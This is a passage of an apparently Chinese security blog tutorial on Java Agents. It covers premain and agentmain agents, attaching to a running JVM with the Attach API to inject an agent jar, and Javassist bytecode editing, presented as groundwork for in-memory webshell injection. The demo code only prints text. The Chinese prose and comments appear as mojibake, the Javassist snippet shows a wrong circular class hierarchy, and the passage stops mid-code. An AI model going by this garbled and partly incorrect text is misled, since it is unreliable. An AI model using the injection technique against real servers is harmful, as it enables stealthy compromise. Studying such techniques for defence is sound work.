title="ç›®å½•ç»“æ„ï¼š"></a>ç›®å½•ç»“æ„ï¼š</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523457.png" alt="img"></p><h5 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h5><p>åˆ›å»ºä¿©ä¸ªæ–‡ä»¶å¤¹ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523797.png" alt="img"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>HelloAgent.<span class="hljs-keyword">java</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523695.png" alt="img"></p><h5 id="åˆ›å»ºAgent-JARæ–‡ä»¶"><a href="#åˆ›å»ºAgent-JARæ–‡ä»¶" class="headerlink" title="åˆ›å»ºAgent JARæ–‡ä»¶"></a>åˆ›å»ºAgent JARæ–‡ä»¶</h5><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">jar cfm ..\dist\agent.jar ..\src\main\resources\MANIFEST.MF JavaAgentPremain.<span class="hljs-keyword">class</span><br>jar cfm ..\dist\hello.jar ..\src\main\resources1\MANIFEST.MF HelloAgent.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523614.png" alt="img"></p><h5 id="æµ‹è¯•è¿è¡Œ"><a href="#æµ‹è¯•è¿è¡Œ" class="headerlink" title="æµ‹è¯•è¿è¡Œ"></a>æµ‹è¯•è¿è¡Œ</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">javaagent:agent.jar </span>-<span class="hljs-keyword">jar </span>hello.<span class="hljs-keyword">jar</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523677.png" alt="img"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="4-1-2-agentmain-Agent"><a href="#4-1-2-agentmain-Agent" class="headerlink" title="4.1.2 agentmain-Agent"></a>4.1.2 agentmain-Agent</h3><p>agentmain-Agentèƒ½å¤Ÿåœ¨JVMå¯åŠ¨ä¹‹ååŠ è½½å¹¶å®ç°ç›¸åº”çš„ä¿®æ”¹å­—èŠ‚ç åŠŸèƒ½ã€‚  </p><p>premainæ–¹æ³•åœ¨JDK1.5ä¸­æä¾›ï¼Œåœ¨JDKç‰ˆæœ¬ä¸º1.5æ—¶ï¼Œå¼€å‘è€…åªèƒ½åœ¨mainåŠ è½½ä¹‹å‰æ·»åŠ æ‰‹è„šï¼Œä½†æ˜¯å¯¹äºå¤§éƒ¨åˆ†å†…å­˜é©¬æ³¨å…¥æ—¶ï¼Œéƒ½æ˜¯JVMå·²ç»è¿è¡Œçš„æƒ…å†µä¸‹ã€‚åœ¨JDK1.6ä¸­å®ç°äº†attach-on-demandï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨AttachAPIåŠ¨æ€çš„åŠ è½½Agentï¼Œagentmainèƒ½å¤Ÿåœ¨JVMå¯åŠ¨ååŠ è½½å¹¶å®ç°ç›¸åº”çš„ä¿®æ”¹å­—èŠ‚ç çš„åŠŸèƒ½ã€‚</p><p>AttachAPIåœ¨tool.jarä¸­ï¼Œè€ŒJVMå¯åŠ¨æ—¶é»˜è®¤ä¸åŠ è½½è¯¥ä¾èµ–ï¼Œéœ€è¦æˆ‘ä»¬åœ¨classpathä¸­é¢å¤–è¿›è¡ŒæŒ‡å®š</p><h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p>VirtualMachine å¯ä»¥å®ç°è·å– JVM ä¿¡æ¯ã€å†…å­˜dumpã€ç°æˆdumpã€ç±»ä¿¡æ¯ç»Ÿè®¡ï¼ˆä¾‹å¦‚JVMåŠ è½½çš„ç±»ï¼‰ç­‰åŠŸèƒ½ã€‚</p><p>è¯¥ç±»å…è®¸æˆ‘ä»¬é€šè¿‡ç»™attachæ–¹æ³•ä¼ å…¥ä¸€ä¸ªJVMçš„PIDï¼Œæ¥è¿œç¨‹è¿æ¥åˆ°è¯¥JVMä¸Š ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥å¯¹è¿æ¥çš„JVMè¿›è¡Œå„ç§æ“ä½œï¼Œå¦‚æ³¨å…¥Agentã€‚ä¸‹é¢æ˜¯è¯¥ç±»çš„ä¸»è¦æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å…è®¸æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªJVMçš„PIDï¼Œç„¶åè¿œç¨‹è¿æ¥åˆ°è¯¥JVMä¸Š</span><br>VirtualMachine.attach()<br><span class="hljs-comment">//å‘JVMæ³¨å†Œä¸€ä¸ªä»£ç†ç¨‹åºagentï¼Œåœ¨è¯¥agentçš„ä»£ç†ç¨‹åºä¸­ä¼šå¾—åˆ°ä¸€ä¸ªInstrumentationå®ä¾‹ï¼Œè¯¥å®ä¾‹å¯ä»¥ åœ¨classåŠ è½½å‰æ”¹å˜classçš„å­—èŠ‚ç ï¼Œä¹Ÿå¯ä»¥åœ¨classåŠ è½½åé‡æ–°åŠ è½½ã€‚åœ¨è°ƒç”¨Instrumentationå®ä¾‹çš„æ–¹æ³•æ—¶ï¼Œè¿™äº›æ–¹æ³•ä¼šä½¿ç”¨ClassFileTransformeræ¥å£ä¸­æä¾›çš„æ–¹æ³•è¿›è¡Œå¤„ç†</span><br>VirtualMachine.loadAgent()<br><span class="hljs-comment">//è·å¾—å½“å‰æ‰€æœ‰çš„JVMåˆ—è¡¨</span><br>VirtualMachine.list()<br><span class="hljs-comment">//è§£é™¤ä¸ç‰¹å®šJVMçš„è¿æ¥</span><br>VirtualMachine.detach()<br></code></pre></td></tr></table></figure><h4 id="VirtualMachineDescriptor-ç±»"><a href="#VirtualMachineDescriptor-ç±»" class="headerlink" title="VirtualMachineDescriptor ç±»"></a>VirtualMachineDescriptor ç±»</h4><p><code>com.sun.tools.attach.VirtualMachineDescriptor</code>ç±»æ˜¯ä¸€ä¸ªç”¨æ¥æè¿°ç‰¹å®šè™šæ‹Ÿæœºçš„ç±»ï¼Œå…¶æ–¹æ³•å¯ä»¥è·å–è™šæ‹Ÿæœºçš„å„ç§ä¿¡æ¯å¦‚PIDã€è™šæ‹Ÿæœºåç§°ç­‰ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªè·å–ç‰¹å®šè™šæ‹ŸæœºPIDçš„ç¤ºä¾‹</p><p>ç¤ºä¾‹ï¼š</p><p>pom.xml:</p><p><a href="https://blog.csdn.net/weixin_39309402/article/details/102480878">Missing artifact com.sun:tools:jar:1.8.0æœ‰æ•ˆè§£å†³åŠæ³•ï¼ˆäº²æµ‹ï¼‰-CSDNåšå®¢</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.sun/tools --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.0_451<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>system<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">systemPath</span>&gt;</span>$&#123;JAVA_HOME&#125;/lib/tools.jar<span class="hljs-tag">&lt;/<span class="hljs-name">systemPath</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">get_PID</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-keyword">if</span>(vmd.displayName().equals(<span class="hljs-string">&quot;com.test.get_PID&quot;</span>)) &#123;<br>                System.out.println(vmd.id());<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523760.png" alt="img"></p><h4 id="å®ç°-agentmain-Agent"><a href="#å®ç°-agentmain-Agent" class="headerlink" title="å®ç° agentmain-Agent"></a>å®ç° agentmain-Agent</h4><p>ç¼–å†™ä¸€ä¸ª <code>Sleep_Hello</code>ç±»ï¼Œæ¨¡æ‹Ÿæ­£åœ¨è¿è¡Œçš„ JVM</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SleepHello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–å†™JavaAgentAgentmain</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.agentmain.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaAgentAgentmain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;agentmain-Agent&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é…ç½® MANIFEST.MF æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Agent-Class: com.agentmain.agent.JavaAgentAgentmain<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Can-Set-Native-Method-Prefix: true<br></code></pre></td></tr></table></figure><p>ä¹‹åç¼–è¯‘å¾—åˆ° <strong>Agentmain.jar</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523062.png" alt="img"></p><p>ç¼–å†™æµ‹è¯•ç±»Inject_Agentï¼Œå¯ä»¥å°†agentæ³¨å…¥åˆ°æ­£åœ¨è¿è¡Œçš„JVMä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentInitializationException &#123;<br>        <span class="hljs-comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        String path=<span class="hljs-string">&quot;D:\\JavaCode\\å†…å­˜é©¬\\JavaAgentTest\\dist\\Agentmain.jar&quot;</span>;<br><br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;<br>            System.out.println(vmd.displayName());<br>            <span class="hljs-comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºSleep_Helloåˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent</span><br>            <span class="hljs-keyword">if</span>(vmd.displayName().contains(<span class="hljs-string">&quot;Sleep&quot;</span>))&#123;<br>                <span class="hljs-comment">//è¿æ¥æŒ‡å®šJVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//åŠ è½½Agent</span><br>                virtualMachine.loadAgent(path);<br>                <span class="hljs-comment">//æ–­å¼€JVMè¿æ¥</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆè¿è¡Œ SleepHello.java å†è¿è¡ŒInjectAgent.java</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523253.png" alt="img"></p><h2 id="4-2-åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç "><a href="#4-2-åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç " class="headerlink" title="4.2 åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç "></a>4.2 åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç </h2><h3 id="4-2-1-Javassist"><a href="#4-2-1-Javassist" class="headerlink" title="4.2.1 Javassist"></a>4.2.1 Javassist</h3><p>ç”¨æ¥å¤„ç†Javaå­—èŠ‚ç çš„ç±»åº“ï¼Œå…è®¸åœ¨å·²ç»ç¼–è¯‘å¥½çš„ç±»ä¸­æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œæˆ–è€…ä¿®æ”¹å·²æœ‰çš„æ–¹æ³•ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡æ‰‹åŠ¨çš„æ–¹å¼å»ç”Ÿæˆä¸€ä¸ªæ–°çš„ç±»å¯¹è±¡</p><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>Java å­—èŠ‚ç ä»¥äºŒè¿›åˆ¶çš„å½¢å¼å­˜å‚¨åœ¨ .class æ–‡ä»¶ä¸­ï¼Œæ¯ä¸€ä¸ª.classæ–‡ä»¶åŒ…å«ä¸€ä¸ªJavaç±»æˆ–æ¥å£ã€‚Javaassist å°±æ˜¯ä¸€ä¸ªç”¨æ¥å¤„ç†Javaå­—èŠ‚ç çš„ç±»åº“ã€‚å®ƒå¯ä»¥åœ¨ä¸€ä¸ªå·²ç»ç¼–è¯‘å¥½çš„ç±»ä¸­æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œæˆ–è€…æ˜¯ä¿®æ”¹å·²æœ‰çš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¸éœ€è¦å¯¹å­—èŠ‚ç æ–¹é¢æœ‰æ·±å…¥çš„äº†è§£ã€‚åŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡æ‰‹åŠ¨çš„æ–¹å¼å»ç”Ÿæˆä¸€ä¸ªæ–°çš„ç±»å¯¹è±¡ã€‚</p><h4 id="ç±»æ± -ClassPool"><a href="#ç±»æ± -ClassPool" class="headerlink" title="ç±»æ±  ClassPool"></a>ç±»æ±  ClassPool</h4><p>ClassPoolæ˜¯ CtClass å¯¹è±¡çš„å®¹å™¨ã€‚å®ƒæŒ‰éœ€è¯»å–ç±»æ–‡ä»¶æ¥æ„é€  CtClass å¯¹è±¡ï¼Œå¹¶ä¸”ä¿å­˜ CtClass å¯¹è±¡ä»¥ä¾¿ä»¥åä½¿ç”¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ ClassPool ä¼šåœ¨å†…å­˜ä¸­ç»´æŠ¤æ‰€æœ‰è¢«å®ƒåˆ›å»ºè¿‡çš„ CtClassï¼Œå½“ CtClass æ•°é‡è¿‡å¤šæ—¶ï¼Œä¼šå ç”¨å¤§é‡çš„å†…å­˜ï¼ŒAPI ä¸­ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆæ˜¯æœ‰æ„è¯†çš„è°ƒç”¨ CtClass çš„ detach() æ–¹æ³•ä»¥é‡Šæ”¾å†…å­˜ã€‚</p><p><strong>ä¸»è¦æ–¹æ³•</strong>æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><ul><li>getDefaultï¼šè·å–é»˜è®¤çš„ ClassPool å¯¹è±¡ã€‚</li><li>getã€getCtClassï¼šæ ¹æ®ç±»åè·å– CtClass å¯¹è±¡ï¼Œç”¨äºæ“ä½œç±»çš„å­—èŠ‚ç ã€‚</li><li>makeClassï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ CtClass å¯¹è±¡ï¼Œç”¨äºæ–°å¢ç±»ã€‚</li><li>insertClassPathã€appendClassPathï¼šæ’å…¥ç±»æœç´¢è·¯å¾„ï¼Œæä¾›ç»™ç±»åŠ è½½å™¨ç”¨äºåŠ è½½ç±»ã€‚</li><li>toClassï¼šå°†ä¿®æ”¹åçš„ CtClass åŠ è½½è‡³å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ä¸­ã€‚é€šè¿‡è°ƒç”¨ CtClass çš„ toClass() æ–¹æ³•å®ç°äº†å°† CtClass è½¬æ¢ä¸º Class å¯¹è±¡ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨è¿è¡Œæ—¶ä½¿ç”¨è¿™ä¸ªç±»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ä¸€æ—¦è°ƒç”¨è¯¥æ–¹æ³•ï¼Œåˆ™æ— æ³•ç»§ç»­ä¿®æ”¹å·²ç»è¢«åŠ è½½çš„ Class å¯¹è±¡ã€‚</li></ul><p>è·å¾—æ–¹æ³•å¦‚ä¸‹ï¼š</p><p>é€šè¿‡<code>ClassPool.getDefault()</code>ä½¿ç”¨JVMçš„ç±»æœç´¢è·¯å¾„ã€‚å¦‚æœç¨‹åºè¿è¡Œåœ¨JBossæˆ–è€…Tomcatçš„WebæœåŠ¡å™¨ä¸Šï¼Œåˆ™ClassPoolå¯èƒ½æ— æ³•æ‰¾åˆ°ç”¨æˆ·çš„ç±»ï¼Œå› ä¸ºWebæœåŠ¡å™¨ä¼šä½¿ç”¨å¤šä¸ªç±»åŠ è½½å™¨ä½œä¸ºç³»ç»Ÿç±»åŠ è½½å™¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒClassPoolå¿…é¡»æ·»åŠ é¢å¤–çš„æœç´¢è·¯å¾„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è·å¾—æ–¹æ³•</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-comment">//æ·»åŠ ç±»æœç´¢è·¯å¾„</span><br>cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(&lt;Class&gt;));<br></code></pre></td></tr></table></figure><h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><p>CtClass æ˜¯ Javassist ä¸­çš„ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªç±»æ–‡ä»¶ã€‚</p><p><strong>CtClass éœ€è¦å…³æ³¨çš„æ–¹æ³•ï¼š</strong></p><ul><li>freezeï¼šå†»ç»“ä¸€ä¸ªç±»ï¼Œä½¿å…¶ä¸å¯ä¿®æ”¹ã€‚</li><li>isFrozenï¼šåˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦å·²è¢«å†»ç»“ã€‚</li><li>pruneï¼šåˆ é™¤ç±»ä¸å¿…è¦çš„å±æ€§ï¼Œä»¥å‡å°‘å†…å­˜å ç”¨ã€‚è°ƒç”¨è¯¥æ–¹æ³•åï¼Œè®¸å¤šæ–¹æ³•æ— æ³•å°†æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œæ…ç”¨ã€‚</li><li>defrostï¼šè§£å†»ä¸€ä¸ªç±»ï¼Œä½¿å…¶å¯ä»¥è¢«ä¿®æ”¹ã€‚å¦‚æœäº‹å…ˆçŸ¥é“ä¸€ä¸ªç±»ä¼šè¢« defrost ï¼Œ åˆ™ç¦æ­¢è°ƒç”¨ prune æ–¹æ³•ã€‚</li><li>detachï¼šå°†è¯¥ class ä» ClassPool ä¸­åˆ é™¤ã€‚</li><li>setSuperclassï¼šè®¾ç½®å½“å‰ç±»çš„çˆ¶ç±»ã€‚</li><li>writeFileï¼šå°† CtClass å¯¹è±¡è½¬æ¢ä¸ºç±»æ–‡ä»¶å¹¶å°†å…¶å†™å…¥æœ¬åœ°ç£ç›˜ã€‚</li><li>toClassï¼šé€šè¿‡ç±»åŠ è½½å™¨åŠ è½½è¯¥ CtClass ï¼Œç¤ºä¾‹ï¼š<code>Class clazz = cc.toClass();</code> ã€‚</li><li>toBytecodeï¼šè·å– CtClass çš„å­—èŠ‚ç ï¼Œç¤ºä¾‹ï¼š<code>byte[] b = cc.toBytecode();</code> ã€‚</li></ul><p>å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç è·å–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ClassPool.get(ClassName)<br></code></pre></td></tr></table></figure><h4 id="CtMethod-å’Œ-CtField"><a href="#CtMethod-å’Œ-CtField" class="headerlink" title="CtMethod å’Œ CtField"></a>CtMethod å’Œ CtField</h4><p>CtMethod å’Œ CtField åˆ†åˆ«ä»£è¡¨ Java ç±»ä¸­çš„æ–¹æ³•å’Œå­—æ®µã€‚é€šè¿‡ CtClass å¯¹è±¡ï¼Œå¯ä»¥è·å–ã€æ·»åŠ ã€åˆ é™¤æˆ–ä¿®æ”¹ç±»ä¸­çš„æ–¹æ³•å’Œå­—æ®µã€‚è¿™äº›å¯¹è±¡æä¾›äº†ä¸°å¯Œçš„ API ï¼Œç”¨äºæ“ä½œæ–¹æ³•å’Œå­—æ®µçš„å„ç§å±æ€§ï¼Œå¦‚è®¿é—®ä¿®é¥°ç¬¦ã€åç§°ã€è¿”å›ç±»å‹ç­‰ã€‚</p><p>CtMethod ä¸­çš„ä¸€äº›é‡è¦æ–¹æ³•ï¼š</p><ol><li>insertBeforeï¼šåœ¨æ–¹æ³•çš„èµ·å§‹ä½ç½®æ’å…¥ä»£ç ã€‚</li><li>insterAfterï¼šåœ¨æ–¹æ³•çš„æ‰€æœ‰ return è¯­å¥å‰æ’å…¥ä»£ç ä»¥ç¡®ä¿è¯­å¥èƒ½å¤Ÿè¢«æ‰§è¡Œï¼Œé™¤éé‡åˆ° exception ã€‚</li><li>insertAtï¼šåœ¨æŒ‡å®šçš„ä½ç½®æ’å…¥ä»£ç ã€‚</li><li>setBodyï¼šå°†æ–¹æ³•çš„å†…å®¹è®¾ç½®ä¸ºè¦å†™å…¥çš„ä»£ç ï¼Œå½“æ–¹æ³•è¢« abstract ä¿®é¥°æ—¶ï¼Œè¯¥ä¿®é¥°ç¬¦è¢«ç§»é™¤ã€‚</li><li>makeï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–¹æ³•ã€‚</li></ol><p>åˆ©ç”¨ CtMethod ä¸­çš„ insertBeforeï¼ŒinsterAfterï¼ŒinsertAt ç­‰æ–¹æ³•å¯ä»¥å®ç° AOP å¢å¼ºåŠŸèƒ½ã€‚</p><p>é€šè¿‡<code>CtClass.getDeclaredMethod(MethodName)</code>è·å–ï¼Œå…¶ä¸­è¯¥ç±»æä¾›äº†ä¸€äº›æ–¹æ³•å¯ä»¥è®©æˆ‘ä»¬ç›´æ¥ä¿®æ”¹æ–¹æ³•ä½“ï¼Œæ–¹æ³•å¦‚ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CtMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CtBehavior</span> &#123;<br>    <br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CtBehavior</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CtMethod</span> &#123;<br>    <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBody</span><span class="hljs-params">(String src)</span>;<br><br>    <span class="hljs-comment">// 